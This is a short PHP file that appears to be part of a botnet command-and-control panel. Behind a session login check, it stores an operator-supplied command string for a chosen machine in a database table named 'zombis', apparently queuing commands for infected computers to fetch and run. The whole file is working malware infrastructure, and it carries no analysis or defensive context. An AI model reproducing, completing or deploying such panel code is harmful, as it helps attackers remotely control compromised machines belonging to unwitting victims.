<?php @session_start(); if ( !isset($_SESSION['login']) ){ header ("Location: ../../");  exit() ; }	?>
<?php
require_once('../../includes.php'); 

if( isset($_POST['name']) && !empty($_POST['ComandosCmds']) ){
    $Cmds = $_POST['ComandosCmds'];
	$id = $_POST['name'];
    $Datos = array ('cmds' => $Cmds);
	$UpdateBuscar = array('id' => $id) ;
	$Result = $DB->Update('zombis' , false , $Datos , $UpdateBuscar) ;
	echo $Result['msg'] ;


}


?>

